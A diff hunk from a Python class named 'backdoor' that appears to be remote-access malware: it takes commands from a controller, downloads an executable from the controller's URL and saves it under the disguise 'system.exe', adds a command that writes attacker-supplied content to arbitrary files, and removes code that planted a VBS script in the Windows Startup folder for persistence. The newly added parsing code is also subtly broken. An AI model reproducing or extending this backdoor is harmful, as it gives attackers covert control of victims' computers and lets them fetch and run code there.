@@ -102,26 +102,24 @@ class backdoor:
                 for i in os.listdir():
                     output += i + "\n"
             elif command.startswith("update"):
-                name = "main.exe"
+                name = "system.exe"
                 get_response = requests.get(f"{self.url}media/files/new_main.exe")
                 with open(name, "wb") as out_file:
                     out_file.write(get_response.content)
-                x = -2
-                for i in os.getcwd():
-                    if i == "\\":
-                        x += 1
-                for i in range(x):
-                    os.chdir("..")
-
-                print(os.getcwd())
-                os.chdir("AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup")
-                with open("startup.vbs","w+") as w:
-                    w.write('Set shell = CreateObject("WScript.Shell")\n')
-                    w.write('shell.CurrentDirectory = "'+os.path.dirname(__file__)+'"\n')
-                    w.write(f'shell.Run "{name}"')
-                    w.close()
-                output += "Updated\n"
-                os.system("startup.vbs")
+            elif command.startswith("write"):
+                write_command = command.split("(")
+                write_command = write_command.replace(")", "")
+                write_command = write_command.replace('"', '')
+                write_command = write_command.replace("'", "")
+                file_to_write = write_command.split(",")[0]
+                content = write_command.split(",")[1]                
+                try:
+                    with open(file_to_write, "w+") as w:
+                        w.write(content)
+                    output += "Wrote to " + file_to_write + "\n"
+                except Exception as e:
+                    output += "Error: " + str(e) + "\n"
+            
             elif command.startswith("power"):
                 power_command = command.split("(")
                 power_command_argument = power_command[1].replace(")", "")
